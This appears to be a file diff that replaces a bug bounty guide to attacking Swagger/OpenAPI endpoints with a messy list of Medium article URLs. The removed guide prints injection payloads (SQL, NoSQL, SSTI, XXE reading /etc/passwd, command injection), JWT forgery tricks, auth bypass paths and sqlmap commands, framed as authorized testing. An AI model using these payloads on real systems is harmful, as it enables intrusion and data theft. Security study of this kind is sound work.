@@ -1,499 +1,62 @@
-================================================================================
-              SWAGGER / OpenAPI — BUG BOUNTY HUNTER'S DEEP GUIDE
-                   Think Deep. Hunt Smart. Chase Impact.
-================================================================================
+READ ALL THESE FILES - AS YOUR KNOWLEDGE ---> 
+
+ttps://medium.com/@MuhammedAsfan/how-i-hunt-for-swagger-ui-on-real-targets-a-practical-guide-for-bug-bounty-hunters-d44b284609aa
+https://medium.com/@MuhammedAsfan/how-i-hunt-for-swagger-ui-on-real-targets-a-practical-guide-for-bug-bounty-hunters-d44b284609aa#:~:text=Using%20what%20Swagger%20shows%20you,Bug%20Bounty
+https://dr34m14.medium.com/from-swagger-to-xss-turning-a-misconfigured-configurl-into-a-400-rxss-bounty-34b60301b12b
+https://dr34m14.medium.com/from-swagger-to-xss-turning-a-misconfigured-configurl-into-a-400-rxss-bounty-34b60301b12b#:~:text=Bugbounty%20Writeup,41
+https://medium.com/bugbountywriteup/bugbounty-mastering-the-basics-along-with-resources-part-3-1619f6854e20
+https://medium.com/bugbountywriteup/bugbounty-mastering-the-basics-along-with-resources-part-3-1619f6854e20#:~:text=A%20simple%20Swagger%2Dui%20scanner%20that,various%20XSS%20attacks%20%2D%20vavkamil%2FXSSwagger&text=BugBounty%20%23BugBounty%20Tools%20%23WebDeveloper%20Tool.,Contribute%20to%20kiranreddyrebel%2FPostMessage_Fuzz_Tool%20development%20by%E2%80%A6
+https://hacktivator.medium.com/list/bugbounty-6f037efec685
+https://iamaakashrathee.medium.com/list/xss-f289063ef14d
+https://iamaakashrathee.medium.com/list/xss-f289063ef14d#:~:text=317,5
+https://ramkrivas.medium.com/bug-bounty-program-experience-tips-and-tricks-d40461c19817
+https://ramkrivas.medium.com/bug-bounty-program-experience-tips-and-tricks-d40461c19817#:~:text=Technical%20informations%20for%20hackers%20such,Swagger%20specifications%2C%20interface%20details%2C%20etc.%2C&text=Host%3A%20bugbounty%2Dis.bugbounty.com%3A553,Content%2DType%3A%20application%2Fjson%3B%20charset%3Dutf%2D8
+https://medium.com/@tehmezovismayil/cookie-based-php-local-file-inclusion-bug-bounty-553f8b38d4dc
+https://medium.com/@tehmezovismayil/cookie-based-php-local-file-inclusion-bug-bounty-553f8b38d4dc#:~:text=Steal%20input%20DATA's%20with%20CSS,What%20is%20css%20injection%20%3F&text=Swagger%20API%20Vulnerabilities,See%20more%20recommendations
+https://medium.com/@shahwarshah/mass-hunting-for-leaked-sensitive-documents-375984fa44f4
+https://medium.com/@shahwarshah/mass-hunting-for-leaked-sensitive-documents-375984fa44f4#:~:text=curl%20%2Ds%20https%3A%2F%2Fraw.githubusercontent.com%2Fprojectdiscovery%2Fpublic%2Dbugbounty%2Dprograms%2Fmain%2Fchaos%2Dbugbounty%2Dlist.json%20%7C%20jq&text=Swagger%20API%20Vulnerabilities,1
+https://medium.com/@youssefmohamedsaadhelal1214/from-zero-auth-to-admin-access-c303c0dbe4f8
+https://medium.com/@youssefmohamedsaadhelal1214/from-zero-auth-to-admin-access-c303c0dbe4f8#:~:text=curl%20%2Ds%20%22https%3A%2F%2Fexample.att.com%2Fswagger%2Fv1%2Fswagger.json%22%20%7C%20wc,bytes%20of%20documented%20attack%20surface.&text=Bugbounty%20Writeup,309
+https://medium.com/@HackerMD/google-dorks-google-ko-bana-do-apna-hacking-tool-free-mein-bugs-dhundho-hinglish-mein-287c3a7ffc75
+https://medium.com/@HackerMD/google-dorks-google-ko-bana-do-apna-hacking-tool-free-mein-bugs-dhundho-hinglish-mein-287c3a7ffc75#:~:text=Next%3A%20Article%20%2312%20Waybackurls%20%2B,%23EthicalHacking%20%23Hinglish%20%23PassiveRecon%20%23GitHubDorking%20%23HackerMD
+https://medium.com/@muhammedasfan/how-i-hunt-for-swagger-ui-on-real-targets-a-practical-guide-for-bug-bounty-hunters-d44b284609aa
+https://medium.com/%40MuhammedAsfan/how-i-hunt-for-swagger-ui-on-real-targets-a-practical-guide-for-bug-bounty-hunters-d44b284609aa&ved=2ahUKEwjQw-KGr_SUAxUDTmwGHYyIHKYQFnoECCMQAQ
+https://medium.com/@muhammedasfan/how-i-hunt-for-swagger-ui-on-real-targets-a-practical-guide-for-bug-bounty-hunters-d44b284609aa","timeCached":1780806720943,"url":"medium.com/@muhammedasfan/how-i-hunt-for-swagger-ui-on-real-targets-a-practical-guide-for-bug-bounty-hunters-d44b284609aa","originalScanner":"hti-url","dossierUrl":"https://medium.com/@muhammedasfan/how-i-hunt-for-swagger-ui-on-real-targets-a-practical-guide-for-bug-bounty-hunters-d44b284609aa"%7D
+https://medium.com/%40MuhammedAsfan/how-i-hunt-for-swagger-ui-on-real-targets-a-practical-guide-for-bug-bounty-hunters-d44b284609aa%23:~:text%3DUsing%2520what%2520Swagger%2520shows%2520you,Bug%2520Bounty&ved=2ahUKEwjQw-KGr_SUAxUDTmwGHYyIHKYQ77oQegQIJRAC
+https://dr34m14.medium.com/from-swagger-to-xss-turning-a-misconfigured-configurl-into-a-400-rxss-bounty-34b60301b12b&ved=2ahUKEwjQw-KGr_SUAxUDTmwGHYyIHKYQFnoECBwQAQ
+https://dr34m14.medium.com/from-swagger-to-xss-turning-a-misconfigured-configurl-into-a-400-rxss-bounty-34b60301b12b","timeCached":1780806720424,"url":"dr34m14.medium.com/from-swagger-to-xss-turning-a-misconfigured-configurl-into-a-400-rxss-bounty-34b60301b12b","originalScanner":"hti-url","dossierUrl":"https://dr34m14.medium.com/from-swagger-to-xss-turning-a-misconfigured-configurl-into-a-400-rxss-bounty-34b60301b12b"%7D
+https://dr34m14.medium.com/from-swagger-to-xss-turning-a-misconfigured-configurl-into-a-400-rxss-bounty-34b60301b12b%23:~:text%3DBugbounty%2520Writeup,41&ved=2ahUKEwjQw-KGr_SUAxUDTmwGHYyIHKYQ77oQegQIHxAC
+https://medium.com/bugbountywriteup/bugbounty-mastering-the-basics-along-with-resources-part-3-1619f6854e20&ved=2ahUKEwjQw-KGr_SUAxUDTmwGHYyIHKYQFnoECB4QAQ
+https://medium.com/bugbountywriteup/bugbounty-mastering-the-basics-along-with-resources-part-3-1619f6854e20","dossierUrl":"https://medium.com/bugbountywriteup/bugbounty-mastering-the-basics-along-with-resources-part-3-1619f6854e20"%7D
+https://medium.com/
+https://medium.com/bugbountywriteup/bugbounty-mastering-the-basics-along-with-resources-part-3-1619f6854e20#:~:text=A%20simple%20Swagger%2Dui%20scanner%20that,various%20XSS%20attacks%20%2D%20vavkamil%2FXSSwagger&text=BugBounty%20%23BugBounty%20Tools%20%23WebDeveloper%20Tool.,Contribute%20to%20kiranreddyrebel%2FPostMessage_Fuzz_Tool%20development%20by%E2%80%A6
+https://medium.com/bugbountywriteup/bugbounty-mastering-the-basics-along-with-resources-part-3-1619f6854e20%23:~:text%3DA%2520simple%2520Swagger%252Dui%2520scanner%2520that,various%2520XSS%2520attacks%2520%252D%2520vavkamil%252FXSSwagger%26text%3DBugBounty%2520%2523BugBounty%2520Tools%2520%2523WebDeveloper%2520Tool.,Contribute%2520to%2520kiranreddyrebel%252FPostMessage_Fuzz_Tool%2520development%2520by%25E2%2580%25A6&ved=2ahUKEwjQw-KGr_SUAxUDTmwGHYyIHKYQ77oQegQIIhAC
+https://hacktivator.medium.com/list/bugbounty-6f037efec685&ved=2ahUKEwjQw-KGr_SUAxUDTmwGHYyIHKYQFnoECBoQAQ
+https://hacktivator.medium.com/list/bugbounty-6f037efec685","dossierUrl":"https://hacktivator.medium.com/list/bugbounty-6f037efec685"%7D
+https://hacktivator.medium.com/
+https://iamaakashrathee.medium.com/list/xss-f289063ef14d&ved=2ahUKEwjQw-KGr_SUAxUDTmwGHYyIHKYQFnoECDcQAQ
+https://iamaakashrathee.medium.com/list/xss-f289063ef14d","dossierUrl":"https://iamaakashrathee.medium.com/list/xss-f289063ef14d"%7D
+https://iamaakashrathee.medium.com/list/xss-f289063ef14d%23:~:text%3D317,5&ved=2ahUKEwjQw-KGr_SUAxUDTmwGHYyIHKYQ77oQegQIOxAC
+https://ramkrivas.medium.com/bug-bounty-program-experience-tips-and-tricks-d40461c19817&ved=2ahUKEwjQw-KGr_SUAxUDTmwGHYyIHKYQFnoECC8QAQ
+https://ramkrivas.medium.com/bug-bounty-program-experience-tips-and-tricks-d40461c19817","dossierUrl":"https://ramkrivas.medium.com/bug-bounty-program-experience-tips-and-tricks-d40461c19817"%7D
+https://ramkrivas.medium.com/bug-bounty-program-experience-tips-and-tricks-d40461c19817#:~:text=Technical%20informations%20for%20hackers%20such,Swagger%20specifications%2C%20interface%20details%2C%20etc.%2C&text=Host%3A%20bugbounty%2Dis.bugbounty.com%3A553,Content%2DType%3A%20application%2Fjson%3B%20charset%3Dutf%2D8
+https://ramkrivas.medium.com/bug-bounty-program-experience-tips-and-tricks-d40461c19817%23:~:text%3DTechnical%2520informations%2520for%2520hackers%2520such,Swagger%2520specifications%252C%2520interface%2520details%252C%2520etc.%252C%26text%3DHost%253A%2520bugbounty%252Dis.bugbounty.com%253A553,Content%252DType%253A%2520application%252Fjson%253B%2520charset%253Dutf%252D8&ved=2ahUKEwjQw-KGr_SUAxUDTmwGHYyIHKYQ77oQegQIPBAC
+https://medium.com/%40tehmezovismayil/cookie-based-php-local-file-inclusion-bug-bounty-553f8b38d4dc&ved=2ahUKEwjQw-KGr_SUAxUDTmwGHYyIHKYQFnoECDAQAQ
+https://medium.com/@tehmezovismayil/cookie-based-php-local-file-inclusion-bug-bounty-553f8b38d4dc","dossierUrl":"https://medium.com/@tehmezovismayil/cookie-based-php-local-file-inclusion-bug-bounty-553f8b38d4dc"%7D
+https://medium.com/@tehmezovismayil/cookie-based-php-local-file-inclusion-bug-bounty-553f8b38d4dc#:~:text=Steal%20input%20DATA
+https://medium.com/%40tehmezovismayil/cookie-based-php-local-file-inclusion-bug-bounty-553f8b38d4dc%23:~:text%3DSteal%2520input%2520DATA%27s%2520with%2520CSS,What%2520is%2520css%2520injection%2520%253F%26text%3DSwagger%2520API%2520Vulnerabilities,See%2520more%2520recommendations&ved=2ahUKEwjQw-KGr_SUAxUDTmwGHYyIHKYQ77oQegQIPRAC
+https://medium.com/%40shahwarshah/mass-hunting-for-leaked-sensitive-documents-375984fa44f4&ved=2ahUKEwjQw-KGr_SUAxUDTmwGHYyIHKYQFnoECDYQAQ
+https://medium.com/@shahwarshah/mass-hunting-for-leaked-sensitive-documents-375984fa44f4","dossierUrl":"https://medium.com/@shahwarshah/mass-hunting-for-leaked-sensitive-documents-375984fa44f4"%7D
+https://medium.com/@shahwarshah/mass-hunting-for-leaked-sensitive-documents-375984fa44f4#:~:text=curl%20%2Ds%20https%3A%2F%2Fraw.githubusercontent.com%2Fprojectdiscovery%2Fpublic%2Dbugbounty%2Dprograms%2Fmain%2Fchaos%2Dbugbounty%2Dlist.json%20%7C%20jq&text=Swagger%20API%20Vulnerabilities,1
+https://medium.com/%40shahwarshah/mass-hunting-for-leaked-sensitive-documents-375984fa44f4%23:~:text%3Dcurl%2520%252Ds%2520https%253A%252F%252Fraw.githubusercontent.com%252Fprojectdiscovery%252Fpublic%252Dbugbounty%252Dprograms%252Fmain%252Fchaos%252Dbugbounty%252Dlist.json%2520%257C%2520jq%26text%3DSwagger%2520API%2520Vulnerabilities,1&ved=2ahUKEwjQw-KGr_SUAxUDTmwGHYyIHKYQ77oQegQIPhAC
+https://medium.com/%40youssefmohamedsaadhelal1214/from-zero-auth-to-admin-access-c303c0dbe4f8&ved=2ahUKEwjQw-KGr_SUAxUDTmwGHYyIHKYQFnoECDMQAQ
+https://medium.com/@youssefmohamedsaadhelal1214/from-zero-auth-to-admin-access-c303c0dbe4f8","dossierUrl":"https://medium.com/@youssefmohamedsaadhelal1214/from-zero-auth-to-admin-access-c303c0dbe4f8"%7D
+https://medium.com/@youssefmohamedsaadhelal1214/from-zero-auth-to-admin-access-c303c0dbe4f8#:~:text=curl%20%2Ds%20%22https%3A%2F%2Fexample.att.com%2Fswagger%2Fv1%2Fswagger.json%22%20%7C%20wc,bytes%20of%20documented%20attack%20surface.&text=Bugbounty%20Writeup,309
+https://medium.com/%40youssefmohamedsaadhelal1214/from-zero-auth-to-admin-access-c303c0dbe4f8%23:~:text%3Dcurl%2520%252Ds%2520%2522https%253A%252F%252Fexample.att.com%252Fswagger%252Fv1%252Fswagger.json%2522%2520%257C%2520wc,bytes%2520of%2520documented%2520attack%2520surface.%26text%3DBugbounty%2520Writeup,309&ved=2ahUKEwjQw-KGr_SUAxUDTmwGHYyIHKYQ77oQegQIPxAC
+https://medium.com/@hackermd/google-dorks-google-ko-bana-do-apna-hacking-tool-free-mein-bugs-dhundho-hinglish-mein-287c3a7ffc75
+https://medium.com/%40HackerMD/google-dorks-google-ko-bana-do-apna-hacking-tool-free-mein-bugs-dhundho-hinglish-mein-287c3a7ffc75&ved=2ahUKEwjQw-KGr_SUAxUDTmwGHYyIHKYQFnoECC4QAQ
+https://medium.com/@hackermd/google-dorks-google-ko-bana-do-apna-hacking-tool-free-mein-bugs-dhundho-hinglish-mein-287c3a7ffc75","dossierUrl":"https://medium.com/@hackermd/google-dorks-google-ko-bana-do-apna-hacking-tool-free-mein-bugs-dhundho-hinglish-mein-287c3a7ffc75"%7D
+https://medium.com/%40HackerMD/google-dorks-google-ko-bana-do-apna-hacking-tool-free-mein-bugs-dhundho-hinglish-mein-287c3a7ffc75%23:~:text%3DNext%253A%2520Article%2520%252312%2520Waybackurls%2520%252B,%2523EthicalHacking%2520%2523Hinglish%2520%2523PassiveRecon%2520%2523GitHubDorking%2520%2523HackerMD&ved=2ahUKEwjQw-KGr_SUAxUDTmwGHYyIHKYQ77oQegQIOhAC
 
-This guide is written for authorized bug bounty hunters testing targets within
-scope. Everything here is for legal, ethical security research only.
 
-================================================================================
-  PART 1 — THE MINDSET: HOW TO THINK ABOUT SWAGGER IN BUG BOUNTY
-================================================================================
 
-Most hunters see Swagger UI and think "cool, free docs." Wrong mindset.
-Think of Swagger as the blueprint of the application's attack surface — handed
-to you on a silver platter. Every endpoint listed is a door. Your job is to
-figure out which ones are unlocked, which ones are mislabeled, and which ones
-lead somewhere the developers never intended you to go.
-
-Ask yourself these questions the moment you find a Swagger instance:
-
-  - Is this Swagger UI exposed publicly? Should it be?
-  - Is the API documented here the SAME as the API being used in production?
-  - Are there endpoints documented here that are NOT linked from the frontend?
-  - Does authentication actually protect every endpoint, or just the ones the
-    developer remembered to lock?
-  - Are there admin, internal, or deprecated endpoints buried in the spec?
-  - What data types does this API accept — and what happens if I break them?
-
-The answer to these questions is where your findings live.
-
-================================================================================
-  PART 2 — DISCOVERY: FINDING SWAGGER IN THE WILD
-================================================================================
-
-Swagger doesn't always announce itself. You need to find it first.
-
---- Common Swagger UI Paths ---
-
-/swagger
-/swagger-ui
-/swagger-ui.html
-/swagger-ui/index.html
-/swagger/index.html
-/api/swagger
-/api/swagger-ui
-/api/swagger-ui.html
-/api/swagger/index.html
-/api/docs
-/api/v1/docs
-/api/v2/docs
-/api/v3/docs
-/docs
-/documentation
-/apidocs
-/api-docs
-/v1/api-docs
-/v2/api-docs
-/v3/api-docs
-/openapi
-/openapi.json
-/openapi.yaml
-/swagger.json
-/swagger.yaml
-/api/swagger.json
-/api/swagger.yaml
-/api/openapi.json
-/api/openapi.yaml
-/.well-known/openapi
-/internal/swagger
-/admin/swagger
-/manage/swagger
-/actuator (Spring Boot — can expose API info)
-/actuator/mappings
-/actuator/swagger-ui
-
---- Discovery via Google Dorks ---
-
-inurl:swagger-ui.html
-inurl:/api/swagger
-inurl:/api-docs
-site:target.com inurl:swagger
-site:target.com filetype:json "swagger"
-site:target.com "openapi": "3."
-
---- Discovery via JS Files ---
-
-Download and grep all JS files for hidden API endpoints and Swagger refs:
-
-  grep -r "swagger" *.js
-  grep -r "api-docs" *.js
-  grep -r "openapi" *.js
-  grep -rE "/v[0-9]+/(api|docs|swagger)" *.js
-
-Tools: LinkFinder, waybackurls, gau, hakrawler
-
---- Discovery via Wayback Machine ---
-
-  waybackurls target.com | grep -i swagger
-  waybackurls target.com | grep -i api-docs
-  gau target.com | grep -iE "(swagger|openapi|api-docs)"
-
---- Subdomain Hunting ---
-
-Many programs expose Swagger on internal or staging subdomains:
-
-  api.target.com/swagger
-  dev.target.com/swagger
-  staging.target.com/api-docs
-  internal.target.com/swagger-ui
-  admin-api.target.com/docs
-
-Use: subfinder, amass, assetfinder — then probe all subdomains for Swagger paths.
-
-================================================================================
-  PART 3 — READING THE SPEC: WHAT TO LOOK FOR
-================================================================================
-
-Once you have the Swagger JSON or YAML, download it locally and read it
-carefully before touching a single endpoint. This is your map.
-
-  curl https://target.com/api-docs > swagger.json
-  curl https://target.com/swagger.yaml > swagger.yaml
-
-Things to look for in the raw spec:
-
-  1. HIDDEN / UNDOCUMENTED ENDPOINTS
-     Look for paths that seem sensitive:
-     /admin, /internal, /debug, /test, /dev, /management,
-     /users/{id}/delete, /config, /reset, /export, /backup
-
-  2. DEPRECATED ENDPOINTS
-     Look for tags like "deprecated: true" — these often skip newer auth checks.
-
-  3. AUTHENTICATION MARKERS
-     Check which endpoints have "security: []" (empty = no auth required).
-     In Swagger 2.0, missing "security" field may also mean unauthenticated.
-
-  4. PARAMETER TYPES
-     Look for parameters that accept: file uploads, free-form objects,
-     base64 blobs, XML bodies, or raw JSON — all high-value injection targets.
-
-  5. SERVER LIST (OpenAPI 3.x)
-     The "servers" field may list internal hostnames, staging URLs, or
-     localhost addresses — these reveal infrastructure details.
-
-  6. EXAMPLE VALUES
-     Sometimes developers leave real tokens, IDs, or internal data in
-     example fields. Read every example object carefully.
-
-  7. RESPONSE SCHEMAS
-     Look at what data the API claims to return. If a user object returns
-     "role", "isAdmin", "internalId" — those are fields to probe for in
-     responses even if not shown in the UI.
-
-================================================================================
-  PART 4 — AUTHENTICATION BYPASS TECHNIQUES
-================================================================================
-
-This is where impact lives. A Swagger UI that requires login to VIEW docs
-often does NOT enforce auth the same way on every endpoint. Test each one.
-
---- Technique 1: Unauthenticated Access to Authenticated Endpoints ---
-
-Try every endpoint WITHOUT a token first. Many apps protect the frontend
-but forget to guard backend routes.
-
-  curl -X GET https://api.target.com/v1/admin/users
-  curl -X GET https://api.target.com/v1/users/export
-
---- Technique 2: Remove or Tamper the Auth Header ---
-
-If you have a valid token, try:
-  - Removing the Authorization header entirely
-  - Sending an empty token: Authorization: Bearer
-  - Sending a null token: Authorization: Bearer null
-  - Sending an expired token (keep old tokens when testing)
-  - Sending a token from a lower-privileged account to a privileged endpoint
-
---- Technique 3: Version Switching ---
-
-If v2 requires auth, try the same endpoint on v1:
-
-  /api/v2/admin/users  →  /api/v1/admin/users
-  /api/v2/export       →  /api/v1/export
-
-Older versions often have weaker or missing auth.
-
---- Technique 4: HTTP Method Switching ---
-
-If GET /admin/users requires auth, try:
-  POST /admin/users
-  PUT  /admin/users
-  HEAD /admin/users
-  OPTIONS /admin/users
-
-Some frameworks only apply auth middleware to specific HTTP methods.
-
---- Technique 5: Path Manipulation Bypasses ---
-
-  /api/v1/admin/users
-  /api/v1/ADMIN/users        (uppercase)
-  /api/v1/admin/users/       (trailing slash)
-  /api/v1/./admin/users      (dot segment)
-  /api/v1/admin/../admin/users
-  /api/v1/%61dmin/users      (URL encoding)
-  /api/v1/admin%2Fusers      (encoded slash)
-
---- Technique 6: JWT Manipulation ---
-
-If the API uses JWTs:
-
-  - Decode the JWT at jwt.io
-  - Try algorithm confusion: change "alg": "RS256" to "alg": "HS256"
-    and sign with the public key as secret
-  - Try "alg": "none" — remove signature entirely
-  - Try modifying claims: "role": "user" → "role": "admin"
-  - Try modifying "sub" (user ID) to access other accounts (IDOR via JWT)
-
---- Technique 7: API Key in Alternate Locations ---
-
-If the API requires an API key, try placing it in different spots:
-
-  Header:      X-API-Key: <key>
-  Header:      Authorization: Bearer <key>
-  Header:      Authorization: ApiKey <key>
-  Query param: ?api_key=<key>
-  Query param: ?apikey=<key>
-  Query param: ?token=<key>
-  Body param:  {"api_key": "<key>"}
-
-================================================================================
-  PART 5 — BROKEN OBJECT LEVEL AUTHORIZATION (BOLA / IDOR)
-================================================================================
-
-BOLA is the #1 finding in API bug bounty programs. Swagger hands you every
-object-referencing endpoint on a plate. This is how you exploit it.
-
---- Identifying IDOR-prone Endpoints ---
-
-Look in the spec for any endpoint with path parameters like:
-  /users/{userId}
-  /orders/{orderId}
-  /documents/{docId}
-  /invoices/{invoiceId}
-  /accounts/{accountId}
-
---- Testing IDOR ---
-
-  1. Create two accounts (attacker + victim) if self-registration is in scope.
-  2. Log actions as victim — note the IDs used.
-  3. Switch to attacker token and replay requests with victim's IDs.
-  4. Try numeric enumeration: change 1001 → 1002 → 1003
-  5. Try GUIDs — if sequential or timestamp-based, they may be guessable.
-  6. Try swapping resource types: /users/123 → /admins/123
-
---- Chained IDOR for Higher Impact ---
-
-Read-only IDOR = Medium. But chain it:
-  - IDOR read → reveals PII = High
-  - IDOR write → modify another user's data = High/Critical
-  - IDOR delete → delete another user's account = Critical
-  - IDOR on admin endpoint → privilege escalation = Critical
-
-================================================================================
-  PART 6 — BROKEN FUNCTION LEVEL AUTHORIZATION (BFLA)
-================================================================================
-
-BFLA = accessing functionality you shouldn't have. Swagger shows you ALL
-functions — including admin ones. Test them with a non-admin token.
-
-  curl -X DELETE https://api.target.com/v1/users/999 \
-    -H "Authorization: Bearer <regular_user_token>"
-
-  curl -X GET https://api.target.com/v1/admin/all-users \
-    -H "Authorization: Bearer <regular_user_token>"
-
-  curl -X POST https://api.target.com/v1/users/999/promote \
-    -H "Authorization: Bearer <regular_user_token>" \
-    -d '{"role": "admin"}'
-
-If any of these work — that's a critical BFLA finding.
-
-================================================================================
-  PART 7 — INJECTION ATTACKS VIA SWAGGER ENDPOINTS
-================================================================================
-
-Swagger tells you exactly which parameters exist and what type they expect.
-Use that to target your injection precisely.
-
---- SQL Injection ---
-
-Target string parameters in GET/POST endpoints:
-  ?search=test' OR '1'='1
-  ?id=1 AND SLEEP(5)--
-  ?filter=1; DROP TABLE users--
-
-Use SQLMap against specific Swagger endpoints:
-  sqlmap -u "https://api.target.com/v1/users?id=1" --batch --dbs
-
---- NoSQL Injection ---
-
-For MongoDB-backed APIs (common in Node.js stacks):
-  {"username": {"$gt": ""}}
-  {"username": {"$ne": null}, "password": {"$ne": null}}
-  {"$where": "sleep(5000)"}
-
---- SSTI (Server-Side Template Injection) ---
-
-In string fields:
-  {{7*7}}
-  ${7*7}
-  <%= 7*7 %>
-  #{7*7}
-
-If you get 49 back — pursue RCE.
-
---- XML Injection / XXE ---
-
-If an endpoint accepts XML content type:
-
-  Content-Type: application/xml
-
-  <?xml version="1.0"?>
-  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-  <data>&xxe;</data>
-
---- Command Injection ---
-
-In parameters that look like they interact with the OS (file names, paths, etc.):
-  ; ls -la
-  | whoami
-  `id`
-  $(id)
-
-================================================================================
-  PART 8 — MASS ASSIGNMENT
-================================================================================
-
-Swagger response schemas reveal ALL fields an object has — including ones
-the API doesn't intend you to set. Try sending those extra fields in POST/PUT.
-
-Example: Swagger shows user object has fields:
-  { "username", "email", "role", "isAdmin", "credits" }
-
-But the registration endpoint only asks for username and email. Try:
-
-  POST /api/v1/register
-  {
-    "username": "attacker",
-    "email": "attacker@evil.com",
-    "role": "admin",
-    "isAdmin": true,
-    "credits": 99999
-  }
-
-If the server blindly binds all incoming JSON fields to the object model,
-you just became an admin. This is mass assignment — a critical finding.
-
-================================================================================
-  PART 9 — RATE LIMITING & RESOURCE ABUSE
-================================================================================
-
-Swagger shows you endpoints that cost the server money or compute:
-  - File upload and processing endpoints
-  - Email/SMS sending endpoints
-  - Report generation endpoints
-  - Password reset endpoints
-  - Search endpoints with heavy queries
-
-Test these for:
-  - Missing rate limiting (send 1000 requests rapidly — does it stop you?)
-  - Account enumeration via timing differences on /forgot-password
-  - Sending SMS/email to arbitrary numbers/addresses (abuse potential)
-
-================================================================================
-  PART 10 — SENSITIVE DATA EXPOSURE
-================================================================================
-
---- Swagger UI Itself Exposed in Production ---
-This is a valid finding. Swagger UI in production exposes:
-  - Internal API structure
-  - Parameter names and types
-  - Business logic flows
-  - Sometimes: internal server addresses, tokens in examples
-
-Report it with clear impact: "An unauthenticated attacker can map the entire
-API surface and use this knowledge to target attacks precisely."
-
---- Verbose Error Messages ---
-Send malformed requests and read errors carefully:
-  - Stack traces reveal tech stack, framework versions, file paths
-  - Database errors reveal schema details
-  - Framework errors may include internal hostnames
-
---- Response Filtering Issues ---
-Even if a field isn't SHOWN in the response by default, add it to a
-query/filter parameter:
-  ?fields=id,email,role,passwordHash,internalNotes
-  ?include=sensitiveData
-
-Some APIs return fields if you explicitly ask — even ones you shouldn't see.
-
-================================================================================
-  PART 11 — BUSINESS LOGIC FLAWS
-================================================================================
-
-Swagger gives you the full business flow. Read it as a story and find the
-plot holes.
-
-Examples of logic flaws to hunt:
-  - Can you skip a required step in a multi-step process?
-    (e.g., place an order without payment confirmation?)
-  - Can you apply a discount code unlimited times?
-  - Can you transfer funds to yourself from a different account?
-  - Can you set a negative quantity in an order?
-  - Can you access resources in a "deleted" state?
-  - Can you reuse a one-time token (password reset, email verification)?
-
-These require thinking, not scanning. Read the workflow, map it, then break it.
-
-================================================================================
-  PART 12 — TOOLS AND COMMANDS REFERENCE
-================================================================================
-
---- Downloading and Parsing the Spec ---
-  curl -s https://target.com/api-docs | python3 -m json.tool
-  curl -s https://target.com/swagger.yaml
-  python3 -c "import yaml,json,sys; print(json.dumps(yaml.safe_load(sys.stdin)))" < swagger.yaml
-
---- Extracting All Endpoints from Swagger JSON ---
-  cat swagger.json | python3 -c "
-  import json,sys
-  spec = json.load(sys.stdin)
-  paths = spec.get('paths', {})
-  for path, methods in paths.items():
-      for method in methods:
-          print(method.upper(), path)
-  "
-
---- Converting Swagger to Postman Collection ---
-  Use: https://www.postman.com/tools (import OpenAPI spec directly)
-  Or: openapi-to-postman CLI tool
-
---- Fuzzing Endpoints with ffuf ---
-  ffuf -u https://api.target.com/v1/FUZZ -w wordlist.txt -mc 200,201,401,403
-
---- Scanning with nuclei (Swagger templates) ---
-  nuclei -u https://target.com -t exposures/apis/swagger-api.yaml
-  nuclei -u https://target.com -t exposures/apis/
-
---- Automated API Security Testing ---
-  - 42crunch/api-security-audit (static analysis of swagger spec)
-  - OWASP ZAP with OpenAPI import
-  - Burp Suite — import Swagger spec to populate target map
-
---- JWT Testing ---
-  jwt_tool <token> -M at        (attack modes)
-  jwt_tool <token> -X a         (alg:none attack)
-  jwt_tool <token> -X s         (self-signed)
-
-================================================================================
-  PART 13 — REPORTING FOR MAXIMUM IMPACT
-================================================================================
-
-Don't just report "Swagger UI is exposed." Frame it with demonstrated impact.
-
-BAD:  "Swagger UI is publicly accessible at /swagger-ui.html"
-
-GOOD: "The Swagger UI is publicly accessible without authentication at
-       /swagger-ui.html, exposing the full API surface including 47 endpoints.
-       Using this documentation, I was able to identify and exploit an
-       unauthenticated BOLA vulnerability at /api/v1/users/{id} which allows
-       any unauthenticated user to retrieve full profile data (including PII:
-       name, email, phone, address) of any registered user by incrementing
-       the numeric user ID."
-
-Always:
-  - Provide a full reproduction steps (curl commands preferred)
-  - Show the impact on a real user or data
-  - Attach screenshots or response output as evidence
-  - Calculate CVSS score and justify it
-  - Mention what the attacker gains (data, access, money, persistence)
-
-================================================================================
-  FINAL THOUGHT: THE SWAGGER HUNTER APPROACH
-================================================================================
-
-Most hunters run a scan and call it a day. You read the spec. You think about
-the business. You chain findings. You push every endpoint, every parameter,
-every auth header. You understand that the spec is a promise the developer
-made — and your job is to find every place they broke that promise.
-
-Swagger is not just an API explorer. It is a treasure map.
-Read it that way. Hunt it that way. Report it with IMPACT.
-
-================================================================================
-  This guide is for authorized bug bounty testing only.
-  Always operate within your program's defined scope.
-================================================================================
